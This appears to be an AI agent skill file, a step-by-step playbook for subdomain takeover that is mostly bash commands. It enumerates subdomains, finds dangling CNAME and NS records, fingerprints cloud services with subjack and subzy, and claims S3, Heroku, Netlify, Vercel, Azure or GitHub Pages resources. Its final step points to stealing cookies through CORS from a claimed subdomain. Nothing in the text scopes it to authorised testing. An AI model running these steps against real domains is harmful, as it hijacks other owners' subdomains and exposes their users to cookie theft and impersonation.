---
name: vuln-subdomain-takeover
description: "Subdomain takeover testing — dangling CNAME detection, cloud service fingerprinting, GitHub Pages takeover, S3 bucket takeover, Heroku/Netlify/Vercel claim, NS takeover. Triggers: 'subdomain takeover', 'dangling dns', 'cname takeover', 'domain takeover', 'dns takeover', 'cloud subdomain takeover', 's3 takeover', 'github pages takeover', 'dangling cname'."
---

# Subdomain Takeover Testing

Claim unclaimed cloud/CDN resources pointed to by dangling DNS records.

---

## Phase 1: CNAME Enumeration

```bash
TARGET="target.com"

subfinder -d "$TARGET" -all -silent | anew output/subdomains.txt
amass enum -passive -d "$TARGET" >> output/subdomains.txt
sort -u output/subdomains.txt -o output/subdomains.txt

while IFS= read -r SUB; do
  CNAME=$(dig CNAME +short "$SUB" 2>/dev/null)
  [ -n "$CNAME" ] && echo "$SUB → CNAME: $CNAME"
done < output/subdomains.txt | tee output/cname_records.txt

while IFS= read -r LINE; do
  SUB=$(echo "$LINE" | awk '{print $1}')
  CNAME=$(echo "$LINE" | awk '{print $4}')
  CNAME_STATUS=$(dig A +short "$CNAME" 2>/dev/null)
  [ -z "$CNAME_STATUS" ] && echo "DANGLING: $SUB → $CNAME"
done < output/cname_records.txt | tee output/dangling_cnames.txt
```

---

## Phase 2: Service Fingerprinting

```bash
go install github.com/haccer/subjack@latest 2>/dev/null
go install github.com/PentestPad/subzy@latest 2>/dev/null

subjack -w output/subdomains.txt -t 100 -timeout 30 \
  -ssl -a -m -o output/subjack_results.txt 2>&1

subzy run --targets output/subdomains.txt \
  --output output/subzy_results.txt 2>&1

while IFS= read -r SUB; do
  RESP=$(curl -s -H "Host: $SUB" "http://$SUB/" --connect-timeout 5 2>/dev/null | head -5)
  echo "=== $SUB ==="
  echo "$RESP"
done < output/dangling_cnames.txt | tee output/takeover_fingerprints.txt
```

---

## Phase 3: Exploitation

```bash

# "There isn't a GitHub Pages site here" → claim via github.com → repository → Settings → Pages

# "NoSuchBucket" → aws s3api create-bucket --bucket dangling-target-com --region us-east-1

# "No such app" → heroku create dangling-target-app

# "Not Found" + Netlify headers → claim on netlify.com

# "The deployment could not be found" → vercel claim

# "404 Web Site not found" → claim Azure Web App

# "Fastly error: unknown domain" → register in Fastly

echo "Subdomain takeover PoC at $(date)" > /tmp/index.html

```

---

## Phase 4: NS-Level Takeover

```bash
TARGET="target.com"

while IFS= read -r SUB; do
  NS=$(dig NS +short "$SUB" 2>/dev/null)
  if [ -n "$NS" ]; then

    echo "$SUB NS: $NS"
    whois "$(echo $NS | head -1)" | grep -iE "expir|status|available"
  fi
done < output/subdomains.txt | tee output/ns_takeover.txt
```

---

## Output

Save to `output/`:
- `dangling_cnames.txt` — dangling CNAME records
- `subjack_results.txt` / `subzy_results.txt` — automated takeover findings
- `takeover_poc.txt` — proof of control over claimed subdomain

## Next Phase

→ Use claimed subdomain to steal cookies via CORS
→ `vuln-cors` if claimed subdomain is trusted origin
